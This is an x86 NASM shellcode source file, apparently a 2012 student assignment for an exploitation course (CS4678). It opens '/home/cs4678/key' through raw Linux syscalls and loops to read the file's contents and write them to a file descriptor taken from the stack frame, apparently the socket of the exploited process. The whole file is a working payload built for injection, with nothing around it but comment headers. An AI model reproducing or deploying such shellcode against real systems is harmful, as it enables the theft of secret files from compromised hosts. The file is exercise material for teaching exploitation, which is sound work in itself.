;--------------------------------------------
; Name:
; Class: CS4678
; Assignment 8
; File: retrievekey.asm
; Last modified: 29 Feb 2012
;--------------------------------------------
;
;nasm -f bin retrievekey.asm
;

USE32

section	.text

global	_start


_start:
	xor		ecx, ecx
	xor		edx, edx
	push	edx
	push 	0x79656b2f		; "/key"
	push	0x38373634		; "4678"
	push	0x73632f65		; "e/cs"
	push	0x6d6f682f		; "/hom"
	mov		ebx, esp
	xor		eax, eax
	mov		al, 0x5			; syscall - open
	int		0x80
	mov		edi, eax		; store fd in EDI
	lea		ecx, [ebp-0x321]
	jmp		read
write:
	mov		edx, eax		; write what was read
	mov		ebx, [ebp+0x8]	
	xor		eax, eax
	mov		al, 0x4			; syscall = write
	int		0x80
read:
	mov		dl, 0xff		; read 255 bytes
	mov		ebx, edi		; fd stored in EDI
	mov		al, 0x3			; syscall = read
	int		0x80
	test	eax, eax
	jne		write
	inc		eax
	ret
	
